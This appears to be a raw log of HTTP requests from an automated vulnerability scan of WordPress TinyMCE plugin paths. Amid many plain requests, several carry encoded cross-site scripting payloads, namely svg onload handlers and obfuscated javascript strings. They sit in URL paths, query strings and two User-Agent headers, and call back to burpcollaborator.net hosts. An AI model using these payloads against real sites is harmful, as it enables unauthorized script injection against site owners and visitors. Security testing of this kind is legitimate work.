"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/sortable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//el3lb953wa0yvb1h6ptx0raio9u3k58xylpdc30s%5c56burpcollaborator.net'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/spinner.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/selectable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/selectable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/selectmenu.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/selectmenu.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/selectmenu.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/resizable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/resizable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/resizable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/resizable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/progressbar.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/progressbar.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/progressbar.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/resizable.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/resizable.js?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fsgcz6n0hrovcqpwv13obv55wjnphff37uvoie63%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/progressbar.js?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fsxtznnhh8occ7pdvi35bc5mw0n6hwek6au4hu5j%5c56burpcollaborator.net'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/progressbar.js?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fmg6t6h0briv6qjwp1xo5vz5qjhpbf830uoobez3%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/utils/backup/phpMyAdmin/js/jquery/src/jquery-ui/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//j2mqsem8dfh3cgimnua2hwrn5eb815pxfl6dt3hs%5c56burpcollaborator.net'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/?C=D;O=A&'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fij5p9d37uey2tfzl4tr1yv8mmds5p3dv3jx6nuc%5c56burpcollaborator.net'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/textcolor/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/textcolor/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//q3uxtlnfemiadnjto1b9i3su6lcd99x1npeh17pw%5c56burpcollaborator.net'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: '""><svg/onload=(new(Image)).src='//zx06nuho8vcj7wd2ia5iccm30u6m3jrbhzcm2ar\56burpcollaborator.net'>
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//bzeip6j0a7ev98fekm7ueoof268y5vtnjbgy6mv%5c56burpcollaborator.net'%3e/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/?C=javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2feo6le983za3yyb4h9pwx3rdir9x1uzir9f02qqf%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//shdz7n1hsowcrpxv23pbw56wknqfnfb71vsnfd32%5c56burpcollaborator.net'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wordpress/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/ih3p7d17sew2rfxl2tp1wv6mkdq5n5bx2ltdg34s%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/textcolor/plugin.min.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fgg0n6b05rcv0qdwj1rozvt5kjbp3m4aw1kv7lva%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/kk8raf49vgz4uh0n5vs3zx9onft7q9e15p2cs0h%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/?C=D;O=A HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/ HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpdialogs/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fdbsk18v2m9qxlargwojwqq0he8k0h55xvlp8fw4%5c56burpcollaborator.net'%3e=1 HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/wpautoresize/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: '""><svg/onload=(new(Image)).src='//5ouce08uz13py2489gwo3id9r0xsuvin8b3ytmi\56burpcollaborator.net'>
Connection: close

"
"/wp-includes/js/tinymce/plugins/textcolor/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

"
"/wp-includes/js/tinymce/plugins/textcolor/plugin.js HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
